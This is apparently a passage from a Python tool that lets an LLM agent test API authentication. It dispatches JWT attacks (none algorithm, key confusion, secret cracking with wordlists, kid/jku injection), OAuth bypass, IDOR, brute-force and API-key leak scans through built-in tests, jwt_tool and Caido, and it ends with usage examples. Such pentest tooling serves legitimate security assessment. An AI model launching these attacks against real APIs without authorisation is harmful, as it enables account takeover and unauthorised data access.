    # TOOL: MANUAL (all tests)
    # ══════════════════════════════
    if tool == "manual":
        command_str = f"manual_api_auth_test({target})"

        # ── Determine test endpoint ──
        auth_endpoint = (
            req.endpoints[0] if req.endpoints
            else target + "/api/v1/me"
        )

        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:

            # ── JWT Tests ──
            jwt_futures = {}
            if req.token and jwt_info:
                jwt_futures = {
                    ex.submit(test_jwt_none_algorithm,
                              req.token, auth_endpoint,
                              base_headers): "jwt_none_alg",
                    ex.submit(test_jwt_weak_secret,
                              req.token, auth_endpoint,
                              base_headers, req.wordlist): "jwt_weak_secret",
                    ex.submit(test_jwt_expiry_bypass,
                              req.token, auth_endpoint,
                              base_headers): "jwt_expiry",
                    ex.submit(test_jwt_kid_injection,
                              req.token, auth_endpoint,
                              base_headers): "jwt_kid",
                    ex.submit(test_jwt_jku_injection,
                              req.token, auth_endpoint,
                              base_headers): "jwt_jku",
                    ex.submit(test_jwt_algorithm_confusion,
                              req.token, auth_endpoint,
                              base_headers): "jwt_alg_confusion",
                    ex.submit(test_jwt_embedded_jwk,
                              req.token, auth_endpoint,
                              base_headers): "jwt_embedded_jwk",
                    ex.submit(test_jwt_claims_manipulation,
                              req.token, auth_endpoint,
                              base_headers): "jwt_claims",
                }
                techniques_used.append("jwt_attacks")

            for future in concurrent.futures.as_completed(jwt_futures):
                try:
                    all_findings.append(future.result())
                except Exception as e:
                    all_findings.append(AuthFinding(
                        test_name=jwt_futures[future],
                        category="jwt",
                        evidence=[f"Test error: {e}"],
                    ))

            # ── OAuth Tests ──
            oauth_futs = {
                ex.submit(test_oauth_token_leakage,
                          target, base_headers): "oauth_token_leak",
                ex.submit(test_oauth_state_csrf,
                          target, base_headers): "oauth_state_csrf",
                ex.submit(test_oauth_redirect_uri,
                          target, base_headers): "oauth_redirect",
                ex.submit(test_oauth_pkce_bypass,
                          target, base_headers): "oauth_pkce",
            }
            techniques_used.append("oauth_tests")

            for future in concurrent.futures.as_completed(oauth_futs):
                try:
                    all_findings.append(future.result())
                except Exception as e:
                    all_findings.append(AuthFinding(
                        test_name=oauth_futs[future],
                        category="oauth",
                        evidence=[f"Test error: {e}"],
                    ))

            # ── Broken Auth Tests ──
            auth_futs = {
                ex.submit(test_missing_auth_headers,
                          target, req.endpoints,
                          base_headers): "missing_auth",
                ex.submit(test_http_method_bypass,
                          auth_endpoint, base_headers): "method_bypass",
                ex.submit(test_token_in_url,
                          target, req.token, base_headers): "token_in_url",
                ex.submit(test_mass_assignment,
                          target, req.token, base_headers): "mass_assignment",
                ex.submit(test_bola_horizontal,
                          target, req.token, base_headers): "bola",
            }
            techniques_used.append("broken_auth_tests")

            for future in concurrent.futures.as_completed(auth_futs):
                try:
                    all_findings.append(future.result())
                except Exception as e:
                    all_findings.append(AuthFinding(
                        test_name=auth_futs[future],
                        category="broken_auth",
                        evidence=[f"Test error: {e}"],
                    ))

        # ── IDOR Tests ──
        idor_endpoints = req.endpoints or [
            target + "/api/users/{id}",
            target + "/api/v1/users/{id}",
            target + "/api/orders/{id}",
        ]
        for ep_tmpl in idor_endpoints[:3]:
            idors = test_idor(
                ep_tmpl, req.token, req.user_ids, base_headers
            )
            idor_results.extend(idors)
        techniques_used.append("idor_tests")

        # ── Rate Limit Tests ──
        rate_endpoints = req.endpoints[:2] if req.endpoints else [
            target + "/api/login",
            target + "/api/v1/me",
        ]
        for ep in rate_endpoints:
            rl = test_rate_limiting(ep, base_headers, request_count=30)
            rate_limit_results.append(rl)
        bf = test_brute_force_protection(target, base_headers)
        all_findings.append(bf)
        techniques_used.append("rate_limit_tests")

        # ── API Key Tests ──
        if req.api_key:
            ak_finding = test_api_key_acceptance(
                target, req.api_key, base_headers
            )
            all_findings.append(ak_finding)

        leaks_response = test_api_in_responses(target, base_headers,
                                                req.endpoints)
        leaks_js       = test_api_key_exposure_in_js(target, base_headers)
        api_key_leaks.extend(leaks_response)
        api_key_leaks.extend(leaks_js)

        # Also scan any provided credentials
        if req.credentials:
            cred_str = json.dumps(req.credentials)
            cred_leaks = scan_for_api_keys(cred_str, "credentials_input")
            api_key_leaks.extend(cred_leaks)

        techniques_used.append("api_key_scan")

    # ══════════════════════════════
    # TOOL: JWT_TOOL
    # ══════════════════════════════
    elif tool == "jwt_tool":
        if not req.token:
            error_msg = "jwt_tool requires a token (provide via 'token' parameter)"
        else:
            # Write token to temp file
            import tempfile, os
            tmp = tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False, prefix="jwt_"
            )
            tmp.write(req.token)
            tmp.close()

            auth_endpoint = (
                req.endpoints[0] if req.endpoints
                else target + "/api/v1/me"
            )

            # Build jwt_tool command
            if req.args:
                cmd = ["python3", "-m", "jwt_tool"] + list(req.args)
            else:
                cmd = [
                    "python3", "-m", "jwt_tool",
                    req.token,
                    "-t", auth_endpoint,
                    "-M", "at",          # all tests
                    "-v",
                ]
                if req.wordlist:
                    cmd += ["-C", "-d", req.wordlist]

            # Add auth headers
            for k, v in base_headers.items():
                if k.lower() not in ("authorization",):
                    cmd += ["-H", f"{k}: {v}"]

            command_str = " ".join(cmd)
            stdout, stderr, rc = safe_execute(cmd, req.timeout)
            raw_output = (stdout or stderr)[:5000]

            parsed = parse_jwt_tool(stdout, stderr)
            all_findings.extend(parsed)
            techniques_used.append("jwt_tool_scan")

            if rc != 0 and not parsed:
                error_msg = (stderr or stdout)[:400]

            # Also decode the token ourselves
            if jwt_info:
                techniques_used.append("jwt_decode")

            # Supplement with our own tests
            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
                futs = [
                    ex.submit(test_jwt_none_algorithm,
                              req.token, auth_endpoint, base_headers),
                    ex.submit(test_jwt_kid_injection,
                              req.token, auth_endpoint, base_headers),
                    ex.submit(test_jwt_jku_injection,
                              req.token, auth_endpoint, base_headers),
                ]
                for f in concurrent.futures.as_completed(futs):
                    try:
                        all_findings.append(f.result())
                    except Exception:
                        pass

            # Cleanup
            if os.path.exists(tmp.name):
                os.unlink(tmp.name)

        # Always run API key scan
        leaks = test_api_in_responses(target, base_headers, req.endpoints)
        api_key_leaks.extend(leaks)
        techniques_used.append("api_key_scan")

    # ══════════════════════════════
    # TOOL: BURP
    # ══════════════════════════════
    elif tool == "burp":
        # Try Burp CLI / REST API
        burp_cmd = None

        if req.args:
            burp_cmd = ["burp"] + list(req.args)
        else:
            # Try Caido CLI
            burp_cmd = ["caido", "scan", "--target", target, "--output", "json"]

        command_str = " ".join(burp_cmd) if burp_cmd else "burp_import"
        stdout, stderr, rc = safe_execute(burp_cmd, req.timeout) \
            if burp_cmd else ("", "", -1)
        raw_output = (stdout or stderr)[:5000]

        parsed = parse_burp_output(stdout, target)
        all_findings.extend(parsed)
        techniques_used.append("burp_scan")

        if rc != 0 and not parsed:
            error_msg = (stderr or stdout)[:400]

        # Supplement with manual JWT + auth tests
        if req.token and jwt_info:
            auth_endpoint = req.endpoints[0] if req.endpoints \
                else target + "/api/v1/me"

            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
                futs = [
                    ex.submit(test_jwt_none_algorithm,
                              req.token, auth_endpoint, base_headers),
                    ex.submit(test_jwt_weak_secret,
                              req.token, auth_endpoint,
                              base_headers, req.wordlist),
                    ex.submit(test_jwt_kid_injection,
                              req.token, auth_endpoint, base_headers),
                    ex.submit(test_missing_auth_headers,
                              target, req.endpoints, base_headers),
                ]
                for f in concurrent.futures.as_completed(futs):
                    try:
                        all_findings.append(f.result())
                    except Exception:
                        pass
            techniques_used.append("manual_supplement")

        # Rate limit test
        if req.endpoints:
            rl = test_rate_limiting(req.endpoints[0], base_headers)
            rate_limit_results.append(rl)
            techniques_used.append("rate_limit_tests")

        # API key scan
        leaks = test_api_in_responses(target, base_headers, req.endpoints)
        api_key_leaks.extend(leaks)
        techniques_used.append("api_key_scan")

    # ══════════════════════════════
    # POST-PROCESS
    # ══════════════════════════════
    vulnerable_findings = [f for f in all_findings if f.vulnerable]

    severity_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

    critical_count = sum(1 for f in all_findings
                         if f.severity == "critical" and f.vulnerable)
    high_count     = sum(1 for f in all_findings
                         if f.severity == "high" and f.vulnerable)
    medium_count   = sum(1 for f in all_findings
                         if f.severity == "medium" and f.vulnerable)

    # Sort findings by severity
    all_findings.sort(
        key=lambda f: severity_rank.get(f.severity, 0),
        reverse=True
    )

    # ══════════════════════════════
    # BUILD RESULT
    # ══════════════════════════════
    return APIAuthTestResult(
        success=len(all_findings) > 0,
        tool=tool,
        target=target,
        command=command_str,
        jwt_info=jwt_info,
        findings=all_findings,
        idor_results=idor_results,
        rate_limit_results=rate_limit_results,
        api_key_leaks=api_key_leaks,
        total_findings=len(all_findings),
        total_vulnerable=len(vulnerable_findings),
        critical_count=critical_count,
        high_count=high_count,
        medium_count=medium_count,
        raw_output=raw_output[:5000] if raw_output else None,
        error=error_msg,
        execution_time=round(time.time() - start, 2),
        techniques_used=list(dict.fromkeys(techniques_used)),
    ).model_dump()


# Helper alias used internally
def test_api_in_responses(base_url, headers, endpoints):
    return test_api_key_in_responses(base_url, headers, endpoints)


# ══════════════════════════════════════════════════════════════
# 13. TOOL DEFINITION (for LLM)
# ══════════════════════════════════════════════════════════════

API_AUTH_TEST_TOOL_DEFINITION = {
    "name": "api_auth_test",
    "description": (
        "Test API authentication and authorization security. "
        "JWT: none algorithm, RS256→HS256 confusion, weak secret brute-force, "
        "expiry bypass, kid SQL/path injection, jku/x5u injection, "
        "embedded JWK, claims privilege escalation. "
        "OAuth: token in URL, missing state CSRF, redirect_uri bypass, PKCE downgrade. "
        "IDOR/BOLA: horizontal object access, mass assignment. "
        "Rate limiting: brute-force detection, IP header bypass. "
        "API key leaks: JS files, response bodies, 20+ key patterns. "
        "Broken auth: unauthenticated endpoint access, method override bypass. "
        "Supports jwt_tool, burp/caido, and manual Python (all tests)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "tool": {
                "type": "string",
                "enum": ["jwt_tool", "manual", "burp"],
                "description": (
                    "jwt_tool = dedicated JWT attack toolkit | "
                    "burp     = Burp Suite / Caido integration | "
                    "manual   = all tests built-in Python (recommended)"
                ),
            },
            "target": {
                "type": "string",
                "description": "API base URL (e.g. 'https://api.example.com')",
            },
            "token": {
                "type": "string",
                "description": "JWT or Bearer token to test (e.g. 'eyJhbGc...')",
            },
            "api_key": {
                "type": "string",
                "description": "API key to test for insecure transmission / enumeration",
            },
            "endpoints": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Specific endpoints to test. "
                    "e.g. ['https://api.example.com/api/users/{id}', "
                    "'/api/admin/users', '/api/v1/payments']"
                ),
            },
            "headers": {
                "type": "object",
                "description": (
                    "Additional HTTP headers. "
                    "e.g. {'Cookie': 'session=abc', 'X-Custom-Header': 'value'}"
                ),
            },
            "wordlist": {
                "type": "string",
                "description": (
                    "Wordlist for JWT secret brute-force. "
                    "e.g. '/usr/share/wordlists/jwt-secrets.txt'"
                ),
            },
            "user_ids": {
                "type": "array",
                "description": (
                    "User IDs to try for IDOR tests. "
                    "e.g. [1, 2, 3, 'admin', 'me', 1000]"
                ),
            },
            "credentials": {
                "type": "object",
                "description": (
                    "Credentials for login brute-force protection test. "
                    "e.g. {'username': 'admin', 'password': 'Password123'}"
                ),
            },
            "args": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Raw tool arguments. Examples:\n"
                    "jwt_tool: ['-M', 'at', '-v'] (all tests verbose)\n"
                    "jwt_tool: ['-X', 'a', '-t', 'https://api.example.com/me']\n"
                    "jwt_tool: ['-C', '-d', '/wordlists/jwt.txt']\n"
                    "burp:     ['--config', 'burp_config.json']\n"
                    "manual:   [] (no args needed)"
                ),
            },
        },
        "required": ["tool", "target"],
    },
}


# ══════════════════════════════════════════════════════════════
# 14. USAGE EXAMPLES
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." \
                "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIi" \
                "wiaWF0IjoxNTE2MjM5MDIyfQ." \
                "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    # ─────────────────────────────
    # 1. Manual — full auth test
    # ─────────────────────────────
    r = api_auth_test(
        tool="manual",
        target="https://api.example.com",
        token=JWT_TOKEN,
        endpoints=[
            "https://api.example.com/api/users/{id}",
            "https://api.example.com/api/admin",
        ],
        user_ids=[1, 2, 3, 99, "admin"],
    )
    print("=== MANUAL FULL AUTH TEST ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 2. JWT attacks only
    # ─────────────────────────────
    r = api_auth_test(
        tool="manual",
        target="https://api.example.com",
        token=JWT_TOKEN,
        endpoints=["https://api.example.com/api/v1/me"],
        wordlist="/usr/share/wordlists/jwt-secrets.txt",
    )
    print("=== JWT ATTACKS ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 3. jwt_tool — all tests
    # ─────────────────────────────
    r = api_auth_test(
        tool="jwt_tool",
        target="https://api.example.com",
        token=JWT_TOKEN,
        args=["-M", "at", "-v"],
        endpoints=["https://api.example.com/api/v1/me"],
    )
    print("=== JWT_TOOL ALL TESTS ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 4. jwt_tool — crack secret
    # ─────────────────────────────
    r = api_auth_test(
        tool="jwt_tool",
        target="https://api.example.com",
        token=JWT_TOKEN,
        args=["-C", "-d", "/usr/share/wordlists/rockyou.txt"],
    )
    print("=== JWT_TOOL CRACK ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 5. API key tests
    # ─────────────────────────────
    r = api_auth_test(
        tool="manual",
        target="https://api.example.com",
        api_key="sk_live_abc123def456",
        headers={"X-API-Key": "sk_live_abc123def456"},
    )
    print("=== API KEY TEST ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 6. IDOR focused
    # ─────────────────────────────
    r = api_auth_test(
        tool="manual",
        target="https://api.example.com",
        token=JWT_TOKEN,
        endpoints=[
            "https://api.example.com/api/users/{id}/profile",
            "https://api.example.com/api/orders/{id}",
            "https://api.example.com/api/payments/{id}",
        ],
        user_ids=[1, 2, 3, 100, 999, "admin"],
    )
    print("=== IDOR TEST ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 7. Burp import
    # ─────────────────────────────
    r = api_auth_test(
        tool="burp",
        target="https://api.example.com",
        token=JWT_TOKEN,
    )
    print("=== BURP INTEGRATION ===")
    print(json.dumps(r, indent=2))